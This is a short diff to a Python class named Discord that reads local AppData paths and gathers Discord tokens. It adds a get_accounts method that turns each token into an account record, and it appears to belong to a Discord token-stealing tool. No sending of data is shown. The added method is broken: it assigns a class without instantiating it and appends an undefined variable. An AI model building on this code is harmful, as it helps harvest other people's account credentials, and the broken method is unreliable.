@@ -17,6 +17,7 @@ class Discord:
 
     def __init__(self):
         self.tokens = []
+        self.accounts = []
         self.appdata = appdata = os.getenv("localappdata")
         self.roaming = roaming = os.getenv("appdata")
         self.paths = {
@@ -57,6 +58,18 @@ class Discord:
             available_paths.append(path)
 
         return available_paths
+
+    @catch
+    def get_accounts(self) -> list:
+        tokens = self.get_tokens()
+
+        for token in tokens:
+            # --
+            new_account = Account
+
+            self.accounts.append(account)
+
+        return self.accounts
 
     @catch
     def get_tokens(self) -> list:
